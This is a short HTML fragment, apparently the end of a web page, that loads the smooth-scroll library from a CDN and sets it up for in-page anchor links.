<script src="https://cdn.jsdelivr.net/gh/cferdinandi/smooth-scroll/dist/smooth-scroll.polyfills.min.js"></script>
<script>
  var scroll = new SmoothScroll('a[href*="#"]', {
    speed: 200
  });
</script>





</html>